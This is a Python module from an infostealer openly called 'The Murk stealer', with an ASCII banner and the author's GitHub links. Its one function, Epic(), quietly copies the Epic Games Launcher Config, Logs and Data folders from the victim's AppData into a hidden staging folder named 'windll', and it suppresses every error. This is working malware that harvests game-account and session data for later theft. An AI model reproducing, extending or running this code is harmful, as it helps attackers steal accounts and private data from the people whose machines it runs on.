#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil
"""
all needed paths
"""
path = r'EpicGamesLauncher\Saved\Config'
path1 = r'EpicGamesLauncher\Saved\Logs'
path2 = r'EpicGamesLauncher\Saved\Data'


def Epic():
    try:
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        user = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        #os.makedirs(r'C:\windll\EpicGames')
        shutil.copytree(user+ os.sep + path,rf'{pathtofile}\windll\EpicGames\Config')# copy dirs
        shutil.copytree(user+ os.sep + path1,rf'{pathtofile}\windll\EpicGames\Logs')
        shutil.copytree(user+ os.sep + path2,rf'{pathtofile}\windll\EpicGames\Data')
    except:
        pass